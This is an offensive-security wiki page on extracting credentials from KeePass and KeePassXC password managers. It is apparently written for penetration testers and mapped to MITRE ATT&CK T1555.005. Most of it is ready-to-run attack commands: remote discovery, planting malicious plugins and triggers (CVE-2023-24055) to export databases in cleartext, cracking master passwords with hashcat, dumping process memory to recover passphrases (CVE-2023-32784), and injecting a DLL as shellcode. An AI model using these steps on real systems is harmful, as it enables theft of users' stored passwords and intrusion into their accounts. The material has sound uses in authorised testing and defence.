---
description: >-
  MITRE ATT&CK™ Credentials from Password Stores: Password Managers - Technique
  T1555.005
---

# KeePass

## Theory

Password managers generate and securely store passwords of various services, safeguarding them under a single master password. This master password serves as the key to access all the stored passwords within the password manager.&#x20;

Examples of Password Manager applications:

* [Built-in password managers (Windows)](windows-credential-manager.md)
* Third-party: KeePass, 1Password, LastPass

However, misconfiguration and security flaws are found in these applications that let us access stored data. Various tools could be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications.

## Practice

### Enumeration

{% tabs %}
{% tab title="UNIX-Like" %}
[KeePwn ](https://github.com/Orange-Cyberdefense/KeePwn)(Python) can be used to remotely identify hosts that run KeePass on a target environment.

```bash
# Search by files
python3 KeePwn.py search -u <ADMIN_ACCOUNT> -p <PASSWORD> -d <DOMAIN> -tf ./targets.txt

# Search by processes + csv output
python3 KeePwn.py search -u <ADMIN_ACCOUNT> -p <PASSWORD> -d <DOMAIN> -tf ./targets.txt --threads 4 --get-process --found-only --output keepwn_out.csv
```

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can also be used to remotly check if keepass is installed on the target environment.

```bash
nxc smb <TARGETS> -u <ADMIN_ACCOUNT> -p <PASSWORD> -M keepass_discover
```
{% endtab %}
{% endtabs %}

### KeePass Plugin Abuse

KeePass features a [plugin framework](https://keepass.info/help/v2/plugins.html) which can be abused to load malicious DLLs into KeePass process, allowing attackers **with administrator rights** to easily export the database (see: [KeeFarceRebornPlugin](https://github.com/d3lb3/KeeFarceReborn#make-keepass-inject-keefarce-reborn-as-a-plugin)).

{% tabs %}
{% tab title="UNIX-Like" %}
[KeePwn ](https://github.com/Orange-Cyberdefense/KeePwn)(Python) can be used to abuse this KeePass Plugin feature, exporting the database in cleartext.

{% hint style="info" %}
These actions are made through SMB C$ share access, limiting AV/EDR detection as no command execution is performed.
{% endhint %}

```bash
# List currently installed plugins and enumerate the plugin cache
python3 KeePwn.py plugin check -u <ADMIN_ACCOUNT> -p <PASSWORD> -d <DOMAIN> -t <TARGET>     

# Add and remove your malicious plugins which performs a cleartext export of the database in %APPDATA% on next KeePass launch
python3 KeePwn.py plugin add -u <ADMIN_ACCOUNT> -p <PASSWORD> -d <DOMAIN> -t <TARGET>     

# Poll %APPDATA% for exports and automatically moves it from remote host to local filesystem
python3 KeePwn.py plugin poll -u <ADMIN_ACCOUNT> -p <PASSWORD> -d <DOMAIN> -t <TARGET>     
```
{% endtab %}

{% tab title="Windows" %}
By compiling the [KeeFarceRebornPlugin](https://github.com/d3lb3/KeeFarceReborn/tree/main/KeeFarceRebornPlugin) project, and copying the DLL into the plugins directory (located at at KeePass root, namely _"C:\Program Files\KeePass Password Safe 2\Plugins"_ for a global install), we can abuse KeePass Plugin.

Export the database using malicious plugin:

```bash
KeePass.exe --plgx-create C:\KeeFarceReborn\KeeFarceRebornPlugin
copy C:\KeeFarceReborn\KeeFarceRebornPlugin.plgx "C:\Program Files\KeePass Password Safe 2\Plugins"
```

Export the database by hijacking a legit plugin DLL (requires an existent plugin in use):

```powershell
copy "C:\Program Files\KeePass Password Safe 2\KeePass.exe" .
devenv /build Release KeeFarceRebornPlugin.sln
copy C:\KeeFarceReborn\KeeFarceRebornPlugin\bin\Release\KeeFarceRebornPlugin.dll C:\Users\snovvcrash\AppData\Local\KeePass\PluginCache\3o7A46QKgc2z6Yz1JH88\LegitPlugin.dll
```
{% endtab %}
{% endtabs %}

### KeePass Trigger Abuse - CVE-2023-24055&#x20;

We can modify the `KeePass.config.xml` file to create malicious triggers that automatically exported database entries to accessible locations.

{% hint style="danger" %}
This KeePass Trigger Abuse, identified as [CVE-2023-24055](https://nvd.nist.gov/vuln/detail/cve-2023-24055) only affects **KeePass versions 2.53 and earlier.**
{% endhint %}

{% tabs %}
{% tab title="UNIX-Like" %}
[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to remotly check if keepass is installed on the target computer and then steal the master password trough KeePass Trigger and decrypt the database.

```bash
# Recon
nxc smb <TARGET> -u <ADMIN_ACCOUNT> -p <PASSWORD> -M keepass_discover

# Exploit
nxc smb <TARGET> -u <ADMIN_ACCOUNT> -p <PASSWORD> -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
```

[KeePwn ](https://github.com/Orange-Cyberdefense/KeePwn)(Python) can also be used to remotely abuse KeePass trigger in order to export the database in cleartext.

{% hint style="info" %}
If the configuration file path is not the default location, you can specify one with `--config-path` argument.
{% endhint %}

```bash
# Check if a malicious trigger named "export" is currently written in KeePass configuration
python3 KeePwn.py trigger check -u <ADMIN_ACCOUNT> -p <PASSWORD> -d <DOMAIN> -t <TARGET>     

# Add and remove a malicious trigger named "export" which performs a cleartext export of the database in %APPDATA% on next KeePass launch
python3 KeePwn.py trigger add -u <ADMIN_ACCOUNT> -p <PASSWORD> -d <DOMAIN> -t <TARGET>     

# Poll %APPDATA% for exports and automatically moves it from remote host to local filesystem
python3 KeePwn.py trigger poll -u <ADMIN_ACCOUNT> -p <PASSWORD> -d <DOMAIN> -t <TARGET>     
```
{% endtab %}
{% endtabs %}

### Cracking KDBX Database Master Password

{% tabs %}
{% tab title="Unix-Like" %}
#### Cracking Master Password - Manually

If we gained access to the keepass database, we may be able to extract it and crack the master database password.&#x20;

Keepass database is stored as a `.kdbx` file, we can search for such files using following commands:

```powershell
#PowerShell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

#Cmd
dir /s /b C:\*.kdbx
```

One we exfiltrate the database to our attacking computer, we can start by using [keepass2john](https://gist.github.com/scottlinux/f6cb8b1bb7807e89c09c139064f69881) and save the output hase a crackable hash.

```bash
keepass2john keepass.kdbx > keepass.hash
```

Then, we may crack the master password using hashcat. See [this page](../passwd/brute-force/offline-password-cracking.md) for more details about cracking passwords.

```bash
hashcat -a 0 -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --user
```

Now, we can open the database using [kpcli](https://github.com/rebkwok/kpcli) and dump passwords

<pre class="language-bash"><code class="lang-bash">$ kpcli --kdb=db.kdbx
Provide the master password: *************************
<strong>kpcli:/> dir
</strong>=== Groups ===
Database/

<strong>kpcli:/> cd Database
</strong><strong>kpcli:/Database> dir
</strong>=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Sample Entry                                               keepass.info
1. Sample Entry #2                          keepass.info/help/kb/testform.
2. User Company Password

<strong>kpcli:/Database> show -f 0
</strong>Title: Sample Entry
Uname: User Name
 Pass: Password
  URL: https://keepass.info/
Notes: NotesCracking Master Password - NetExec

NetExec
 (Python) can be used to remotly check if keepass is installed on the target computer and then steal the master password and decrypt the database !
nxc smb &#x3C;TARGETS> -u &#x3C;ADMIN_ACCOUNT> -p &#x3C;PASSWORD> -M keepass_discover
</code></pre>
{% endtab %}
{% endtabs %}

### Extract Passphrase from Memory - CVE-2023-32784 <a href="#extract-passphrase-from-memory" id="extract-passphrase-from-memory"></a>

As described by [@vdohney](https://github.com/vdohney/keepass-password-dumper), it is possible to retrieve the database's master password in memory&#x20;

{% hint style="danger" %}
This KeePass Abuse, identified as [CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784) only affects **KeePass versions priot to 2.54.**
{% endhint %}

{% tabs %}
{% tab title="KeePass" %}
Fisrt, perform a process dump of the running KeePass

```powershell
Get-Process keepass
.\procdump.exe -accepteula -ma 988 KeePass.DMP
```

Retrieve the process dump as well as the .KDBX containing the encrypted database (e.g. through SMB).

[KeePwn ](https://github.com/Orange-Cyberdefense/KeePwn)(Python) can then be used to search for potential master password candidates in dumps. Because the resulting strings will (by design) be incomplete, the module can also be used to bruteforce the missing first character against a specified KDBX file.

```bash
python3 KeePwn.py parse_dump -d <dump_file> --bruteforce <database_file>
```
{% endtab %}

{% tab title="KeePassXC" %}
KeePassXC is also subject to such exploits.&#x20;

Fisrt, perform a process dump of the running KeePassXC

```powershell
Get-Process keepassxc
.\procdump.exe -accepteula -ma 988 KeePassXC.DMP
```

Retrieve the process dump as well as the .KDBX containing the encrypted database (e.g. through SMB).

[KeePass-the-Hash](https://github.com/d3lb3/KeePass-the-Hash) can then be used to search for composite key-like strings from a KeePassXC process dump.

```bash
python3 pass_the_key.py <dump_file> <database_file>
```
{% endtab %}
{% endtabs %}

### KeePass DLL Injection

{% tabs %}
{% tab title="ShellCode Injection" %}
[KeeFarceReborn](https://github.com/d3lb3/KeeFarceReborn) is a standalone DLL that exports databases in cleartext once injected in the KeePass process.

After compiling the DLL, we may use [Donut ](https://github.com/TheWover/donut)to convert it to a shellcode and use it with any injection technique.

```bash
donut "KeeFarceReborn.dll" -c KeeFarceReborn.Program -m Main -e 1
```

#### Post-injection steps

Once the injection is performed, you will see debug messages being printed in MessageBox (which should obviously be removed when used in a real penetration testing scenario) then find the exported database in the current user's _`%APPDATA%`_ (choosed by default, as KeePass will be sure to have write access). The exported XML file can later be imported in any KeePass database without asking for a password
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://attack.mitre.org/techniques/T1555/005/" %}

{% embed url="https://github.com/Orange-Cyberdefense/KeePwn" %}

{% embed url="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/keepass" %}
